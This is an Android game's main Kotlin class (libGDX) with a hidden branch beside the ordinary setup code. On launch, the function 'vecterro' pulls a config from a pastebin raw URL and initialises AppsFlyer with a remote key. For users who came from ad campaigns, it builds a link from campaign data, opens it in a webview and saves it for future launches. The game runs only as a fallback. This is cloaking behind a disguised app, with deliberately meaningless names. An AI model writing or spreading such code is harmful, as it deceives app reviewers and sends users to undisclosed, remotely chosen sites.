package com.vectorvesta.bronfinteh.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import androidx.core.view.isVisible
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.vectorvesta.bronfinteh.MainActivity
import com.vectorvesta.bronfinteh.appContext
import com.vectorvesta.bronfinteh.game.dataStore.DS_Balance
import com.vectorvesta.bronfinteh.game.dataStore.DS_DataItems
import com.vectorvesta.bronfinteh.game.manager.MusicManager
import com.vectorvesta.bronfinteh.game.manager.NavigationManager
import com.vectorvesta.bronfinteh.game.manager.SoundManager
import com.vectorvesta.bronfinteh.game.manager.SpriteManager
import com.vectorvesta.bronfinteh.game.manager.util.MusicUtil
import com.vectorvesta.bronfinteh.game.manager.util.SoundUtil
import com.vectorvesta.bronfinteh.game.manager.util.SpriteUtil
import com.vectorvesta.bronfinteh.game.screens.LoaderScreen
import com.vectorvesta.bronfinteh.game.utils.GameColor
import com.vectorvesta.bronfinteh.game.utils.advanced.AdvancedGame
import com.vectorvesta.bronfinteh.game.utils.disposeAll
import com.vectorvesta.bronfinteh.game.utils.gdxGame
import com.vectorvesta.bronfinteh.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("vectores", MODE_PRIVATE)

    val ds_Balance   = DS_Balance(coroutine)
    val ds_DataItems = DS_DataItems(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        vecterro()
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun vecterro() {
        log("vecterro")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val path = sharedPreferences.getString("patro", "ivan") ?: "ivan"

        try {
            if (path == "ivan") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.ivan, getAppsFlyerConversionListener(simJSON.petro), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, simJSON.ivan, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<NameJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/Hf48RkDn"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = NameJSON(
                    petro = jsonResponse.getString("petro") ?: "",
                    ivan  = jsonResponse.getString("ivan")  ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class NameJSON(val petro: String, val ivan: String)

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?aegtw=$campaign&dsswb=$afAd&tdbrzq=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("patro", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}